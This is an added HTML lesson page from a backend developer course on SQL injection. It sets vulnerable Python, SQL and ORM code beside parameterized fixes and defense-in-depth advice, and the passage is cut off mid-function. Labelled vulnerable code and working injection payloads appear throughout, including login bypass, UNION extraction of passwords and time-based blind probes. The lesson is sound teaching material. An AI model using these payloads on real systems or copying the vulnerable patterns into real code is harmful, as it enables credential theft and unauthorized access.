@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Injection: Attack Vectors and Prevention - Backend Developer Path</title>
+    <link rel="stylesheet" href="/backend-learning/static/css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="/backend-learning/index-py.html">Backend Developer Path</a> &rsaquo;
+            <a href="/backend-learning/phase/phase-8-py.html">Security & Reliability</a> &rsaquo;
+            Web Security
+        </div>
+
+        <div class="lesson-detail-header">
+            <div class="lesson-detail-meta">
+                <span class="lesson-type lesson">lesson</span>
+                <span class="lesson-id-tag">8.1.2</span>
+                <span>~2h</span>
+            </div>
+            <h1>SQL Injection: Attack Vectors and Prevention</h1>
+        </div>
+
+        
+        <section class="content-section intuition-section">
+            <h2>Intuition</h2>
+            <div class="intuition-body">
+                <p>Think of a SQL query as a form letter with designated blank spaces. Parameterized queries are like printing the letter first and then filling in the blanks with a pen — the pen marks can never change the printed structure of the letter. SQL injection is what happens when you let someone dictate the entire letter including its structure — they can rewrite the sentences, add new paragraphs, or cross out sections entirely.</p>
+            </div>
+        </section>
+        
+
+        
+        <article class="lesson-article">
+            <h1>SQL Injection: Attack Vectors and Prevention</h1>
+<p>SQL injection (SQLi) remains one of the most dangerous and prevalent vulnerabilities in web applications. Despite being well-understood for over two decades, it consistently appears in the OWASP Top 10 and continues to be exploited in major breaches. As a backend engineer, understanding every facet of SQL injection — from classic attack vectors to subtle ORM pitfalls — is essential for building secure systems.</p>
+<h2>What Is SQL Injection?</h2>
+<p>SQL injection occurs when untrusted data is incorporated into a SQL query without proper sanitization or parameterization. An attacker crafts input that alters the intended SQL statement, allowing them to read, modify, or delete data, bypass authentication, or even execute operating system commands.</p>
+<p>The fundamental issue is <strong>mixing code (SQL) with data (user input)</strong>. When the boundary between the two is blurred, the database cannot distinguish between the developer's intended query structure and the attacker's malicious additions.</p>
+<h2>Classic (In-Band) SQL Injection</h2>
+<p>Classic SQL injection is the most straightforward form. The attacker's payload modifies the query, and the results are returned directly in the application's response.</p>
+<h3>Vulnerable Pattern: String Concatenation</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># VULNERABLE — Never do this</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">psycopg2</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">get_user</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="n">conn</span> <span class="o">=</span> <span class="n">psycopg2</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">dbname</span><span class="o">=</span><span class="s2">&quot;myapp&quot;</span><span class="p">)</span>
+    <span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT id, username, email FROM users WHERE username = &#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39;&quot;</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</code></pre></div>
+
+<p>An attacker passing <code>admin' OR '1'='1</code> as the username produces:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">email</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span>
+</code></pre></div>
+
+<p>This returns every user in the table because <code>'1'='1'</code> is always true.</p>
+<h3>Tautology-Based Authentication Bypass</h3>
+<p>Consider a login function:</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># VULNERABLE</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">authenticate</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM users WHERE username = &#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39; AND password = &#39;</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">&#39;&quot;</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+    <span class="n">user</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">user</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+</code></pre></div>
+
+<p>With input <code>username = admin' --</code> and any password, the query becomes:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="c1">--&#39; AND password = &#39;anything&#39;</span>
+</code></pre></div>
+
+<p>The <code>--</code> comment syntax causes the database to ignore the password check entirely.</p>
+<h2>UNION-Based SQL Injection</h2>
+<p>UNION-based injection leverages the <code>UNION SELECT</code> statement to append additional queries, extracting data from other tables.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># VULNERABLE</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">search_products</span><span class="p">(</span><span class="n">category</span><span class="p">):</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT name, price FROM products WHERE category = &#39;</span><span class="si">{</span><span class="n">category</span><span class="si">}</span><span class="s2">&#39;&quot;</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+</code></pre></div>
+
+<p>An attacker supplies:</p>
+<div class="highlight"><pre><span></span><code>&#39; UNION SELECT username, password FROM users --
+</code></pre></div>
+
+<p>The resulting query:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">price</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">products</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">category</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="c1">--&#39;</span>
+</code></pre></div>
+
+<p>This returns product results merged with all usernames and passwords. The attacker must match the number of columns in the original query, which they can discover through systematic probing (e.g., <code>ORDER BY 1</code>, <code>ORDER BY 2</code>, etc. until an error occurs).</p>
+<h2>Blind SQL Injection</h2>
+<p>When the application does not display query results or error messages directly, attackers use blind techniques to extract data one bit at a time.</p>
+<h3>Boolean-Based Blind Injection</h3>
+<p>The attacker infers information by observing whether the application behaves differently for true vs. false conditions.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># VULNERABLE</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">check_user_exists</span><span class="p">(</span><span class="n">user_id</span><span class="p">):</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT 1 FROM users WHERE id = </span><span class="si">{</span><span class="n">user_id</span><span class="si">}</span><span class="s2">&quot;</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span>
+</code></pre></div>
+
+<p>Attacker input: <code>1 AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a'</code></p>
+<p>If the response indicates the user exists, the first character of the admin password is <code>'a'</code>. The attacker repeats this for each character position and value, automating the process with tools like sqlmap.</p>
+<h3>Time-Based Blind Injection</h3>
+<p>When even boolean differences are not observable, attackers use database sleep functions to infer results from response timing.</p>
+<div class="highlight"><pre><span></span><code>1; SELECT CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#39;admin&#39;)=&#39;a&#39; THEN pg_sleep(5) ELSE pg_sleep(0) END --
+</code></pre></div>
+
+<p>If the response takes approximately 5 seconds, the guess was correct. This is slower but works even when application responses are completely uniform.</p>
+<h2>Second-Order SQL Injection</h2>
+<p>Second-order (or stored) SQL injection is particularly insidious because the malicious payload is stored safely in the database and only triggers when it is later used in another query.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># Step 1: Registration — input is properly parameterized during INSERT</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">register_user</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+        <span class="s2">&quot;INSERT INTO users (username, password) VALUES (</span><span class="si">%s</span><span class="s2">, </span><span class="si">%s</span><span class="s2">)&quot;</span><span class="p">,</span>
+        <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+    <span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+
+<span class="c1"># Step 2: Profile update — VULNERABLE because stored data is trusted</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">update_email</span><span class="p">(</span><span class="n">current_username</span><span class="p">,</span> <span class="n">new_email</span><span class="p">):</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;SELECT username FROM users WHERE username = &#39;</span><span class="si">{</span><span class="n">current_username</span><span class="si">}</span><span class="s2">&#39;&quot;</span><span class="p">)</span>
+    <span class="n">row</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+    <span class="n">stored_username</span> <span class="o">=</span> <span class="n">row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="c1"># Developer assumes stored_username is safe because it came from the DB</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s2">&quot;UPDATE users SET email = &#39;</span><span class="si">{</span><span class="n">new_email</span><span class="si">}</span><span class="s2">&#39; WHERE username = &#39;</span><span class="si">{</span><span class="n">stored_username</span><span class="si">}</span><span class="s2">&#39;&quot;</span>
+    <span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+</code></pre></div>
+
+<p>An attacker registers with username <code>admin' --</code>. The INSERT is parameterized, so the value is stored literally. But when <code>update_email</code> reads it back and interpolates it into a new query, the injection activates. The lesson: <strong>data from your own database is not inherently safe</strong>.</p>
+<h2>Stored Procedure Injection</h2>
+<p>Stored procedures are sometimes mistakenly believed to be immune to SQL injection. They are not, particularly when they use dynamic SQL internally.</p>
+<div class="highlight"><pre><span></span><code><span class="c1">-- VULNERABLE stored procedure (PostgreSQL)</span>
+<span class="k">CREATE</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="k">REPLACE</span><span class="w"> </span><span class="k">FUNCTION</span><span class="w"> </span><span class="n">search_users</span><span class="p">(</span><span class="n">search_term</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">)</span>
+<span class="k">RETURNS</span><span class="w"> </span><span class="k">SETOF</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="err">$$</span>
+<span class="k">BEGIN</span>
+<span class="w">    </span><span class="k">RETURN</span><span class="w"> </span><span class="n">QUERY</span><span class="w"> </span><span class="k">EXECUTE</span>
+<span class="w">        </span><span class="s1">&#39;SELECT * FROM users WHERE username LIKE &#39;&#39;%&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">search_term</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s1">&#39;%&#39;&#39;&#39;</span><span class="p">;</span>
+<span class="k">END</span><span class="p">;</span>
+<span class="err">$$</span><span class="w"> </span><span class="k">LANGUAGE</span><span class="w"> </span><span class="n">plpgsql</span><span class="p">;</span>
+</code></pre></div>
+
+<p>The <code>EXECUTE</code> with string concatenation inside the procedure is just as vulnerable as doing it in application code. The safe version uses <code>EXECUTE ... USING</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="c1">-- SAFE stored procedure</span>
+<span class="k">CREATE</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="k">REPLACE</span><span class="w"> </span><span class="k">FUNCTION</span><span class="w"> </span><span class="n">search_users</span><span class="p">(</span><span class="n">search_term</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">)</span>
+<span class="k">RETURNS</span><span class="w"> </span><span class="k">SETOF</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="err">$$</span>
+<span class="k">BEGIN</span>
+<span class="w">    </span><span class="k">RETURN</span><span class="w"> </span><span class="n">QUERY</span><span class="w"> </span><span class="k">EXECUTE</span>
+<span class="w">        </span><span class="s1">&#39;SELECT * FROM users WHERE username LIKE $1&#39;</span>
+<span class="w">        </span><span class="k">USING</span><span class="w"> </span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">search_term</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s1">&#39;%&#39;</span><span class="p">;</span>
+<span class="k">END</span><span class="p">;</span>
+<span class="err">$$</span><span class="w"> </span><span class="k">LANGUAGE</span><span class="w"> </span><span class="n">plpgsql</span><span class="p">;</span>
+</code></pre></div>
+
+<h2>ORM-Specific Pitfalls</h2>
+<p>ORMs generally protect against SQL injection by using parameterized queries under the hood. However, every major ORM provides escape hatches for raw SQL, and these are where vulnerabilities creep in.</p>
+<h3>SQLAlchemy Core — Vulnerable vs. Safe</h3>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">sqlalchemy</span><span class="w"> </span><span class="kn">import</span> <span class="n">create_engine</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">Table</span><span class="p">,</span> <span class="n">MetaData</span><span class="p">,</span> <span class="n">select</span>
+
+<span class="n">engine</span> <span class="o">=</span> <span class="n">create_engine</span><span class="p">(</span><span class="s2">&quot;postgresql://localhost/myapp&quot;</span><span class="p">)</span>
+<span class="n">metadata</span> <span class="o">=</span> <span class="n">MetaData</span><span class="p">()</span>
+<span class="n">users</span> <span class="o">=</span> <span class="n">Table</span><span class="p">(</span><span class="s1">&#39;users&#39;</span><span class="p">,</span> <span class="n">metadata</span><span class="p">,</span> <span class="n">autoload_with</span><span class="o">=</span><span class="n">engine</span><span class="p">)</span>
+
+<span class="c1"># VULNERABLE — raw string interpolation with text()</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_user_vulnerable</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="k">with</span> <span class="n">engine</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span> <span class="k">as</span> <span class="n">conn</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+            <span class="n">text</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;SELECT * FROM users WHERE username = &#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39;&quot;</span><span class="p">)</span>
+        <span class="p">)</span>
+        <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+
+<span class="c1"># SAFE — bound parameters with text()</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_user_safe</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="k">with</span> <span class="n">engine</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span> <span class="k">as</span> <span class="n">conn</span><span class="p">:</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+            <span class="n">text</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users WHERE username = :username&quot;</span><span class="p">),</span>
+            <span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">username</span><span class="p">}</span>
+        <span class="p">)</span>
+        <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+
+<span class="c1"># SAFE — using the SQLAlchemy expression language</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_user_expression</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="k">with</span> <span class="n">engine</span><span class="o">.</span><span class="n">connect</span><span class="p">()</span> <span class="k">as</span> <span class="n">conn</span><span class="p">:</span>
+        <span class="n">stmt</span> <span class="o">=</span> <span class="n">select</span><span class="p">(</span><span class="n">users</span><span class="p">)</span><span class="o">.</span><span class="n">where</span><span class="p">(</span><span class="n">users</span><span class="o">.</span><span class="n">c</span><span class="o">.</span><span class="n">username</span> <span class="o">==</span> <span class="n">username</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">stmt</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">result</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+</code></pre></div>
+
+<p>The expression language (<code>select</code>, <code>where</code>, <code>join</code>, etc.) is the preferred approach because it constructs parameterized queries automatically and provides compile-time structure that is harder to misuse.</p>
+<h3>SQLAlchemy ORM — Vulnerable vs. Safe</h3>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">sqlalchemy.orm</span><span class="w"> </span><span class="kn">import</span> <span class="n">Session</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">sqlalchemy</span><span class="w"> </span><span class="kn">import</span> <span class="n">text</span>
+
+<span class="c1"># VULNERABLE — raw SQL in ORM session</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">find_user_vulnerable</span><span class="p">(</span><span class="n">session</span><span class="p">:</span> <span class="n">Session</span><span class="p">,</span> <span class="n">username</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">session</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+        <span class="n">text</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;SELECT * FROM users WHERE username = &#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39;&quot;</span><span class="p">)</span>
+    <span class="p">)</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+
+<span class="c1"># SAFE — parameterized raw SQL</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">find_user_safe_raw</span><span class="p">(</span><span class="n">session</span><span class="p">:</span> <span class="n">Session</span><span class="p">,</span> <span class="n">username</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">session</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+        <span class="n">text</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users WHERE username = :username&quot;</span><span class="p">),</span>
+        <span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="n">username</span><span class="p">}</span>
+    <span class="p">)</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+
+<span class="c1"># SAFE — ORM query interface</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">find_user_safe_orm</span><span class="p">(</span><span class="n">session</span><span class="p">:</span> <span class="n">Session</span><span class="p">,</span> <span class="n">username</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">session</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">User</span><span class="p">)</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span><span class="n">User</span><span class="o">.</span><span class="n">username</span> <span class="o">==</span> <span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
+
+<span class="c1"># VULNERABLE — filter with raw string</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">find_user_filter_vulnerable</span><span class="p">(</span><span class="n">session</span><span class="p">:</span> <span class="n">Session</span><span class="p">,</span> <span class="n">username</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">session</span><span class="o">.</span><span class="n">query</span><span class="p">(</span><span class="n">User</span><span class="p">)</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span>
+        <span class="n">text</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;username = &#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39;&quot;</span><span class="p">)</span>
+    <span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Note the last example: even within the ORM query interface, using <code>text()</code> with string formatting reintroduces the vulnerability. The safest pattern is always using the ORM's attribute-based filtering.</p>
+<h3>Django ORM — Vulnerable vs. Safe</h3>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">django.db</span><span class="w"> </span><span class="kn">import</span> <span class="n">connection</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">myapp.models</span><span class="w"> </span><span class="kn">import</span> <span class="n">User</span>
+
+<span class="c1"># VULNERABLE — raw SQL with string formatting</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_user_vulnerable</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="k">with</span> <span class="n">connection</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
+        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;SELECT * FROM auth_user WHERE username = &#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39;&quot;</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+
+<span class="c1"># SAFE — parameterized raw SQL</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_user_safe_raw</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="k">with</span> <span class="n">connection</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="k">as</span> <span class="n">cursor</span><span class="p">:</span>
+        <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+            <span class="s2">&quot;SELECT * FROM auth_user WHERE username = </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span>
+            <span class="p">[</span><span class="n">username</span><span class="p">]</span>
+        <span class="p">)</span>
+        <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
+
+<span class="c1"># SAFE — Django ORM</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_user_safe_orm</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">User</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
+
+<span class="c1"># VULNERABLE — extra() with raw SQL (deprecated for good reason)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_user_extra_vulnerable</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">User</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="n">extra</span><span class="p">(</span>
+        <span class="n">where</span><span class="o">=</span><span class="p">[</span><span class="sa">f</span><span class="s2">&quot;username = &#39;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#39;&quot;</span><span class="p">]</span>
+    <span class="p">)</span>
+
+<span class="c1"># SAFE — extra() with params</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">get_user_extra_safe</span><span class="p">(</span><span class="n">username</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">User</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="n">extra</span><span class="p">(</span>
+        <span class="n">where</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;username = </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">],</span>
+        <span class="n">params</span><span class="o">=</span><span class="p">[</span><span class="n">username</span><span class="p">]</span>
+    <span class="p">)</span>
+</code></pre></div>
+
+<p>Django's <code>extra()</code> method, <code>RawSQL()</code> expressions, and <code>raw()</code> queryset method all accept raw SQL and can be injection vectors if misused. Django has deprecated <code>extra()</code> partly for this reason.</p>
+<h2>Web Application Firewall (WAF) Considerations</h2>
+<p>WAFs can provide a layer of defense by detecting and blocking common SQL injection patterns. However, they should never be your primary defense.</p>
+<p><strong>Why WAFs are insufficient alone:</strong></p>
+<ol>
+<li><strong>Bypass techniques are well-documented.</strong> Attackers use encoding tricks, comment insertion, case variation, and other obfuscation methods to evade WAF signatures.</li>
+<li><strong>False positives.</strong> Overly aggressive WAF rules block legitimate traffic. A user searching for "O'Brien" might trigger injection rules.</li>
+<li><strong>Context blindness.</strong> WAFs analyze HTTP requests but lack understanding of your application's SQL context, leading to both false positives and false negatives.</li>
+<li><strong>Second-order injection is invisible to WAFs.</strong> The malicious payload enters through a legitimate-looking request and triggers later.</li>
+</ol>
+<p>WAFs are best used as part of a defense-in-depth strategy — a safety net, not a primary control.</p>
+<h2>Defense-in-Depth: Comprehensive Prevention Strategy</h2>
+<h3>Layer 1: Parameterized Queries (Primary Defense)</h3>
+<p>This is the single most important defense. Every database driver supports parameterized queries. Use them without exception.</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># The golden rule — always use parameterized queries</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">safe_query</span><span class="p">(</span><span class="n">cursor</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">status</span><span class="p">):</span>
+    <span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+        <span class="s2">&quot;SELECT * FROM users WHERE username = </span><span class="si">%s</span><span class="s2"> AND status = </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span>
+        <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">status</span><span class="p">)</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>
+</code></pre></div>
+
+<p>Parameterized queries work because the database receives the query structure and data separately. The database compiles the query structure first, then binds the data values. There is no opportunity for the data to alter the query structure.</p>
+<h3>Layer 2: Input Validation</h3>
+<p>Validate and constrain input to expected formats before it reaches any query:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">validate_username</span><span class="p">(</span><span class="n">username</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[a-zA-Z0-9_]{3,30}$&#39;</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
+        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;Invalid username format&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">username</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">validate_sort_column</span><span class="p">(</span><span class="n">column</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+    <span class="n">allowed_columns</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;email&#39;</span><span class="p">,</span> <span class="s1">&#39;created_at&#39;</span><span class="p">,</span> <span class="s1">&#39;id&#39;</span><span class="p">}</span>
+    <span class="k">if</span> <span class="n">column</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">allowed_columns</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Invalid sort column: </span><span class="si">{</span><span class="n">column</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">column</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">validate_sort_order</span><span class="p">(</span><span class="n">order</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
